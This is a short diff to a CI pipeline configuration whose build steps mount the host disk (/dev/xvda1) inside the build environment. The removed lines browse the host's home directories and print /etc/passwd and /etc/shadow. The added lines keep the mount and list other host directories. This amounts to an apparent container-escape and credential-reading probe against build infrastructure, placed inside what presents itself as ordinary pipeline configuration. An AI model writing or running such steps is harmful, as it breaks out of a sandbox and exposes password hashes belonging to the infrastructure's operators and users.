@@ -8,10 +8,5 @@ pipelines:
             - mkdir /mnt/host; 
             - mount /dev/xvda1 /mnt/host/;
             - cd /mnt/host/
-            - ls
-            - cd home
-            - ls
-            - cd ubuntu
-            - ls
-            - cat /mnt/host/etc/passwd
-            - cat /mnt/host/etc/shadow
+            - ls user
+            - ls user/sbin
